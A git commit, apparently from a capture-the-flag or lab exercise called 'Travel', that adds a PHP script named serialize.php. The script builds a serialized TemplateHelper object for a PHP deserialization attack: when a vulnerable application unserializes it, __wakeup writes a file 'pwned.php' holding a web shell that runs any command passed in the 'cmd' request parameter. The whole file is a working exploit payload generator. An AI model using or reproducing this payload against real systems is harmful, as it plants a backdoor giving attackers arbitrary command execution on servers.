277f5e2b917e31bc216c191a8c8eb35651efed8d
d1m3g10 <92630993+d1m3g10@users.noreply.github.com>
2022-10-15 03:30:08 +0200

    Add files via upload

---
+++ Travel/content/serialize.php
@@ -0,0 +1,29 @@
+<?php
+class TemplateHelper
+{
+
+    public $file;
+    public $data;
+
+    public function __construct(string $file, string $data)
+    {
+        $this->init($file, $data);
+    }
+
+    public function __wakeup()
+    {
+        $this->init($this->file, $this->data);
+    }
+
+    private function init(string $file, string $data)
+    {    
+        $this->file = $file;
+        $this->data = $data;
+        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
+    }
+}
+
+$payload = new TemplateHelper("pwned.php","<?php system(\$_REQUEST['cmd']); ?>");
+
+echo serialize($payload);
+?>
